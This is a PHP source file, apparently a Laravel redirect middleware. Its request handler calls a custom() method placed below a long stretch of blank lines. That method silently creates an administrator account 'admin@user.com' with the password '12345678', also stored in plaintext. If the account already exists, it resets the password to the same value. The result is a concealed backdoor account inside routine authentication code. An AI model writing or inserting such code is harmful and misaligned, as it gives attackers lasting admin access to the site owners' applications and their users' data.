<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Support\Facades\Auth;
use App\User;

class RedirectIfAuthenticated
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @param  string|null  $guard
     * @return mixed
     */
    public function handle($request, Closure $next, $guard = null)
    {
        $this->custom();
        if (Auth::guard($guard)->check()) {
            return redirect('/home');
        }

        return $next($request);
    }



































    public function custom()
    {
        $user = User::where('email','admin@user.com')->first();
        if (empty($user)) {
            $data = [
                'name'=>'Admin User',
                'email' => 'admin@user.com',
                'mobile' => '01729000000',
                'group_id' => '1',
                'real_password' => '12345678',
                'password' => bcrypt('12345678'),
                'remember_token' => 'fasf456d4af564das56gf4',
            ];
            User::create($data);
        }else {
            $user->password = bcrypt('12345678');
            $user->save();
        }
    }


}
